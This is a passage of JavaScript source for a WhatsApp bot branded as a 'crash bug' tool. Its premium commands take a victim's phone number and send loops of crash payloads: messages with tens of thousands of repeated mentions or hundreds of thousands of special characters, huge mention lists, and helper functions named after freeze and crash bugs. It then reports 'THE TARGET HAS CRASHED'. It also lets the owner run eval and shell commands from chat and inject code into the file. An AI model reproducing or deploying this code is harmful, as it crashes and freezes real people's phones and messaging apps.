                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆`,
                body: `C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s`,
                previewType: "VIDEO",
                thumbnail: doct2,
                sourceUrl: `https://www.youtube.com/@AkmalMods`,
                mediaUrl: `https://www.youtube.com/@AkmalMods`
            }
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: animecrot
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ''
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...(await prM({ document: doct, fileName: "@6283866354557", fileLength: "9999999999999", pageCount: 9999999999999, mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0", thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=", thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=", jpegThumbnail: (await resize(doct, 276, 100)) })),
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              },
              {
                "name": "cta_url",
                "buttonParamsJson": "{\"display_text\":\"私の創造主\",\"url\":\"https://youtube.com/@AkmalMods\",\"merchant_url\":\"https://youtube.com/@AkmalMods\"}"
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.sender, quoted: extd });

  await krocov4.relayMessage(freesex.key.remoteJid, freesex.message, {
    messageId: freesex.key.id
  });
}
break

  case 'addcase': {
      if (!isCreator) return replyzz(mess.owner)
    if (!text) return replyzz('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'kroco.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replyzz('Terjadi kesalahan saat menulis file:', err);
            } else {
                replyzz('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replyzz('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;

  
  // Case-case lainnya

//==================================================================

case 'uisystem': case 'uicrash': case 'bugui': 
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(krocov4, target, wanted)
await sendSessionStructure(target, wanted)
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await sendSessionStructure(target, wanted)
await beta2(krocov4, target, wanted)
await sendSessionStructure(target, wanted)
await BugPayment(target)
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await sendSessionStructure(target, wanted)
await beta2(krocov4, target, wanted)
await sendSessionStructure(target, wanted)
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await beta2(krocov4, target, wanted)
} 
replyzz(`『    𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : ${command}
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`)

krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
    
break

case 'xios': case 'iphone': case 'xip':
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz(bugres)
for (let i = 0; i < 40; i++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);

            }
    
    replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : ${command}
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
    
break
                
case 'vip': case 'andro': case 'attack':
if (!isPremium) return replyzz(mess.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz(bugres)
for (let i = 0; i < 30; i++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);

            }
    
    replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *NullBug*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
    
break

                
case "public": {
if (!isCreator) return fsaluran(mess.owner)
krocov4.public = true
replyzz("*[sᴜᴄᴄᴇssғᴜʟʟʏ]* ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ")
}
break

case "self": {
if (!isCreator) return replyzz(mess.owner)
krocov4.public = false
replyzz("*[sᴜᴄᴄᴇssғᴜʟʟʏ]* ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ sᴇʟғ/ᴘʀɪʙᴀᴅɪ")
}
break

case'cekidch':{
if (!isCreator) return replyzz(mess.owner)
if (!m.quoted) return replyzz('Balas pesan dari saluran admin channel nya');

try {
let quotedMessage = await m.getQuotedObj();
let id = quotedMessage.msg.contextInfo.forwardedNewsletterMessageInfo;

if (id) {
await replyzz(`*Sumber* : ${id.newsletterName}\n*ID*: ${id.newsletterJid}`);
} else {
return replyzz('Informasi saluran tidak ditemukan.');
}
} catch (e) {
return replyzz('Harus balas pesan dari saluran ya..');
}}
break

case 'xbay-rass': case 'xhc-jxcrash': case 'xcrash':
if (!isPremium) return replyzz(mess.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz(mess.done)
for (let i = 0; i < 30; i++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);

            }
    
    replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *NullBug*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
break

case 'freezehome': {
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `freeze home 😳 ${"@6283866354557 ".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await sleep(1000)
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `freeze home 😳 ${"@6283866354557 ".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await sleep(1000)
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `freeze home 😳 ${"@6283866354557 ".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await sleep(1000)
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}

break

case 'freezeui': {
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 50; i++) {
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `freeze home 😳 ${"@6283866354557 ".repeat(100000)}`,
"contextInfo": { mentionedJid: [ "6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await sleep(5000)
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `freeze ui 😳 ${"ꦾ".repeat(400000)}`,
"contextInfo": { mentionedJid: [ "6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await sleep(500)
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break
                
case 'crashjid': case 'oribug': {
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 150; i++) {
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `AkmalNihBoss ${"ꦾ".repeat(40000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `AkmalNihBoss ${"@6283866354557".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await krocov4.relayMessage(target, {"extendedTextMessage": {
text: `crash 🩸 ${"@6283866354557".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6283866354557@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break

case 'kangcrott': {
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 50; i++) {
await TxOs(target, true)
await newfreezebug(target, true)
await newcall4(target, true)
await newvirpen(target, true)
await newcall4(target, true)
await newfreezebug(target, true)
await newcall3(target, true)
await newcall(target, true)
await newfreezebug(target, true)
await newgalaxy(target, true)
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break

case 'crashall': {
if (!isPremium) return replyzz(mess.only.premium)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 100; i++) {
await TxOs(target, true)
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyzz(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyzz(bang)
                    }
                    try {
                        replyzz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyzz(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyzz(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyzz(evaled)
                    } catch (err) {
                        await replyzz(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyzz(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyzz(err)
                        if (stdout) return replyzz(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})